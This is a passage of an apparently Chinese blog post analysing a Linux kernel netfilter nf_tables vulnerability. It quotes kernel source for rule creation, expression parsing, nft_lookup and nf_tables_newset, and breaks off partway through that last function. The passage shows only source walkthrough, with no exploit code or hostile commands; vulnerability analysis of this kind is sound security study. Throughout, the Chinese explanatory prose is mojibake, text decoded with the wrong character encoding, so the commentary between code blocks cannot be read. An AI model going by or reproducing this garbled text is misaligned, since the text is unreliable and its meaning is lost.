class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line">chain-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (net-&gt;nft.validate_state == NFT_VALIDATE_DO)</span><br><span class="line"><span class="keyword">return</span> nft_table_validate(net, table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err2:</span><br><span class="line">nf_tables_rule_release(&amp;ctx, rule);</span><br><span class="line">err1:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (info[i].ops) &#123;</span><br><span class="line">module_put(info[i].ops-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">info[i].ops-&gt;type-&gt;release_ops(info[i].ops);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå‰ä¸¤æ­¥å°±æ˜¯è·å–<code>table</code>å’Œ<code>chain</code>ï¼Œè‹¥æ˜¯è®¾ç½®äº†<code>nla[NFTA_RULE_EXPRESSIONS]</code>åˆ™éå†æ‰€æœ‰çš„<code>expression</code>çš„å¤§å°ï¼Œå¹¶èµ‹å€¼ç»™sizeã€‚è‹¥æ˜¯è®¾ç½®äº†<code>nla[NFTA_RULE_USERDATA]</code>åˆ™æ˜¯æŠŠ<code>userdata</code>çš„å¤§å°æ”¾åˆ°usizeä¸­ã€‚</p><p><code>rule = kzalloc(sizeof(*rule) + size + usize, GFP_KERNEL);</code>éšå³è°ƒç”¨è¿™æ¡è¯­å¥åˆ†é…<code>rule</code>ï¼Œç´§æ¥ç€å°±æ˜¯ä¸€ç³»åˆ—åˆå§‹åŒ–ã€‚</p><h3 id="åˆ›å»ºexpressionæ“ä½œ"><a href="#åˆ›å»ºexpressionæ“ä½œ" class="headerlink" title="åˆ›å»ºexpressionæ“ä½œ"></a>åˆ›å»ºexpressionæ“ä½œ</h3><p>åˆ›å»º<code>expression</code>çš„æ“ä½œå…¶å®ä¹Ÿæ˜¯å‘ç”Ÿåœ¨<code>nf_tables_newrule</code>å‡½æ•°ä¸­çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123;</span><br><span class="line">  info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">                        <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">                        GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!info)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">    err = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    <span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    size += info[n].ops-&gt;size;</span><br><span class="line">    n++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯åœ¨è¿™é‡Œé€šè¿‡<code>nf_tables_expr_parse</code>åˆå§‹åŒ–<code>info</code>ä¸ºæŸä¸ªtypeçš„opsã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *__<span class="title">nft_expr_type_get</span>(<span class="title">u8</span> <span class="title">family</span>,</span></span><br><span class="line"><span class="class">       <span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(type, &amp;nf_tables_expressions, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nla_strcmp(nla, type-&gt;name) &amp;&amp;</span><br><span class="line">    (!type-&gt;family || type-&gt;family == family))</span><br><span class="line"><span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>nf_tables_expr_parse</code>æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>__nft_expr_type_get</code>éšåéå†<code>nf_tables_expressions</code>ï¼Œæ‰¾åˆ°å¯¹åº”çš„<code>type</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">NFPROTO_UNSPEC =  <span class="number">0</span>,</span><br><span class="line">NFPROTO_INET   =  <span class="number">1</span>,</span><br><span class="line">NFPROTO_IPV4   =  <span class="number">2</span>,</span><br><span class="line">NFPROTO_ARP    =  <span class="number">3</span>,</span><br><span class="line">NFPROTO_NETDEV =  <span class="number">5</span>,</span><br><span class="line">NFPROTO_BRIDGE =  <span class="number">7</span>,</span><br><span class="line">NFPROTO_IPV6   = <span class="number">10</span>,</span><br><span class="line">NFPROTO_DECNET = <span class="number">12</span>,</span><br><span class="line">NFPROTO_NUMPROTO,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">nft_basic_types</span>[] =</span> &#123;</span><br><span class="line">&amp;nft_imm_type,</span><br><span class="line">&amp;nft_cmp_type,</span><br><span class="line">&amp;nft_lookup_type,</span><br><span class="line">&amp;nft_bitwise_type,</span><br><span class="line">&amp;nft_byteorder_type,</span><br><span class="line">&amp;nft_payload_type,</span><br><span class="line">&amp;nft_dynset_type,</span><br><span class="line">&amp;nft_range_type,</span><br><span class="line">&amp;nft_meta_type,</span><br><span class="line">&amp;nft_rt_type,</span><br><span class="line">&amp;nft_exthdr_type,</span><br><span class="line">&amp;nft_last_type,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ ¹æ®ä¸Šé¢çš„ä¾‹å­çœ‹ï¼Œè¿™é‡Œä¼šè°ƒç”¨åˆ°çš„æ˜¯<code>nft_lookup_type</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_lookup_ops</span> =</span> &#123;</span><br><span class="line">.type= &amp;nft_lookup_type,</span><br><span class="line">.size= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_lookup)),</span><br><span class="line">.eval= nft_lookup_eval,</span><br><span class="line">.init= nft_lookup_init,</span><br><span class="line">.activate= nft_lookup_activate,</span><br><span class="line">.deactivate= nft_lookup_deactivate,</span><br><span class="line">.destroy= nft_lookup_destroy,</span><br><span class="line">.dump= nft_lookup_dump,</span><br><span class="line">.validate= nft_lookup_validate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> <span class="title">nft_lookup_type</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;lookup&quot;</span>,</span><br><span class="line">.ops= &amp;nft_lookup_ops,</span><br><span class="line">.policy= nft_lookup_policy,</span><br><span class="line">.maxattr= NFTA_LOOKUP_MAX,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newexpr</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nft_expr_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> *<span class="title">ops</span> =</span> info-&gt;ops;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">expr-&gt;ops = ops;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;init) &#123;</span><br><span class="line">err = ops-&gt;init(ctx, expr, (<span class="keyword">const</span> struct nlattr **)info-&gt;tb);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err1:</span><br><span class="line">expr-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ ¹æ®ä¸åŒç±»å‹è¿›è¡Œåˆå§‹åŒ–ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ¼æ´å‘ç”Ÿåœ¨åˆ›å»º<code>set</code>çš„è¿‡ç¨‹ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newset</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr *<span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u32 ktype, dtype, flags, policy, gc_int, objtype;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *udata;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> alloc_size;</span><br><span class="line">u64 timeout;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">int</span> err, i;</span><br><span class="line">u16 udlen;</span><br><span class="line">u64 size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TABLE] == <span class="literal">NULL</span> || nla[NFTA_SET_NAME] == <span class="literal">NULL</span> ||</span><br><span class="line">    nla[NFTA_SET_KEY_LEN] == <span class="literal">NULL</span> || nla[NFTA_SET_ID] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">ktype = NFT_DATA_VALUE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_KEY_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ktype = ntohl(nla_get_be32(nla[NFTA_SET_KEY_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((ktype &amp; NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">desc.klen = ntohl(nla_get_be32(nla[NFTA_SET_KEY_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.klen == <span class="number">0</span> || desc.klen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_FLAGS] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_SET_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp;</span><br><span class="line">    ~(NFT_SET_ANONYMOUS | NFT_SET_CONSTANT | NFT_SET_INTERVAL |</span><br><span class="line">      NFT_SET_TIMEOUT | NFT_SET_MAP | NFT_SET_EVAL |</span><br><span class="line">      NFT_SET_OBJECT | NFT_SET_CONCAT | NFT_SET_EXPR))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="comment">/* Only one of these operations is supported */</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_MAP | NFT_SET_OBJECT)) ==</span><br><span class="line">    (NFT_SET_MAP | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_EVAL | NFT_SET_OBJECT)) ==</span><br><span class="line">    (NFT_SET_EVAL | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dtype = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">dtype = ntohl(nla_get_be32(nla[NFTA_SET_DATA_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((dtype &amp; NFT_DATA_RESERVED_MASK) ==</span><br><span class="line">    NFT_DATA_RESERVED_MASK &amp;&amp;</span><br><span class="line">    dtype != NFT_DATA_VERDICT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dtype != NFT_DATA_VERDICT) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_LEN] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.dlen == <span class="number">0</span> || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">desc.dlen = <span class="keyword">sizeof</span>(struct nft_verdict);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_OBJ_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">objtype = ntohl(nla_get_be32(nla[NFTA_SET_OBJ_TYPE]));</span><br><span class="line"><span class="keyword">if</span> (objtype == NFT_OBJECT_UNSPEC || objtype &gt; NFT_OBJECT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_OBJECT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">objtype = NFT_OBJECT_UNSPEC;</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TIMEOUT] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nf_msecs_to_jiffies64(nla[NFTA_SET_TIMEOUT], &amp;timeout);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">gc_int = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_GC_INTERVAL] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">gc_int = ntohl(nla_get_be32(nla[NFTA_SET_GC_INTERVAL]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = NFT_SET_POL_PERFORMANCE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_POLICY] != <span class="literal">NULL</span>)</span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_SET_POLICY]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DESC] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = nf_tables_set_desc_parse(&amp;desc, nla[NFTA_SET_DESC]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR] || nla[NFTA_SET_EXPRESSIONS])</span><br><span class="line">desc.expr = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_SET_TABLE], family, genmask,</span><br><span class="line"> NETLINK_CB(skb).portid);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup(table, nla[NFTA_SET_NAME], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(<span class="built_in">set</span>) != -ENOENT) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">ops = nft_select_set_ops(&amp;ctx, nla, &amp;desc, policy);</span><br><span class="line"><span 